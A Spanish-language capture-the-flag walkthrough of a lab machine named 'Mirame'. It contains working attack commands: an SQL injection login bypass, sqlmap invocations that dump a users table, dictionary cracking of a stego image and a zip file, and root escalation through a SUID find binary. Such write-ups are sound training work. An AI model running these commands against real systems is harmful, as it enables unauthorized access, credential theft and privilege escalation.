---
description: '🧠Dificultad: Fácil | 🔓15/03/2026'
---

# 🟩 Mirame

## 🕵️ Reconocimiento

Comenzamos con un escaneo de puertos con `nmap`:

```bash
nmap -sC -sV -Pn $IPTARGET | tee nmap
```

<figure><img src="../../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

Tenemos abiertos los puertos de los servicios SSH y HTTP. Realizamos un escaneo de directorios con `ffuf`:

```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u "http://$IPTARGET/FUZZ" -e .html,.php,.txt,.xml,.js
```

<figure><img src="../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

Si entramos a `index.php`, encontramos un panel de login:

<figure><img src="../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

Solo de ver que el cuadro del input del usuario y contraseña están descuadrados, me atrevería a decir que el autor de la página se ha descuidado también en el tema de inyecciones SQL, pero vamos a seguir echándole un vistazo al servicio web.

La página `page.php` muestra un cuadro donde podemos consultar el tiempo de una ciudad a través de una API.

<figure><img src="../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

La página `auth.php` está hecha para mandar un POST con las credenciales del login y comprobar si son correctas.

<figure><img src="../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

Si ponemos una `'` en el campo de usuario, salta un error SQL. No está sanitizando la entrada correctamente.

<figure><img src="../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

Si introducimos `' or 1=1; —` en el campo de usuario, y cualquier cosa en contraseña, nos redirecciona a la página `page.php`. Un poco raro porque esta página no requería autenticación desde un principio, es totalmente accesible, así que vamos a suponer que esta página no es relevante.

## 🚪 Ganando acceso

Usando sqlmap en la página `auth.php`, podemos listar las bases de datos.

```bash
sqlmap -u "http://172.17.0.2/auth.php" --data="username=hola&password=hola" --batch --level=5 --risk=3 --dbs
```

<figure><img src="../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

```bash
sqlmap -u "http://172.17.0.2/auth.php" --data="username=hola&password=hola" --batch -D users --tables
```

<figure><img src="../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

```bash
sqlmap -u "http://172.17.0.2/auth.php" --data="username=hola&password=hola" --batch -D users -T usuarios --dump
```

<figure><img src="../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

Probé a tirar fuerza bruta con hydra a los usuarios que aparecen con las contraseñas, además de hacerlo también con el diccionario `rockyou.txt`, y no encontré nada. Me di cuenta que `directoriotravieso` podría ser un directorio oculto en la web:

<figure><img src="../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

Nos llevamos la imagen a nuestra máquina y la analizamos. Con `steghide` descubrimos que contiene un fichero oculto, pero tiene contraseña. Para averiguar que contraseña tiene, le hacemos un ataque de diccionario con `stegseek`:

```bash
stegseek miramebien.jpg /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

El zip oculto también está protegido con una contraseña. Le hacemos otro ataque de diccionario con `john`, pero antes, preparamos el hash con `zip2john`.

```bash
zip2john ocultito.zip > hash_zip.txt
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip.txt
```

<figure><img src="../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

Extraemos el contenido del zip y encontramos unas credenciales:

<figure><img src="../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

Ahora si podemos entrar a la máquina por SSH:

<figure><img src="../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

## 💥 Escalada de privilegios

Buscamos los binarios con permisos `suid`:

<figure><img src="../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

Con el binario find podemos ejecutar `/bin/sh` y, al tener el bit suid activado, lo haremos como el propietario del binario (`root`):

```bash
find . -exec /bin/sh -p \; -quit
```

<figure><img src="../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>
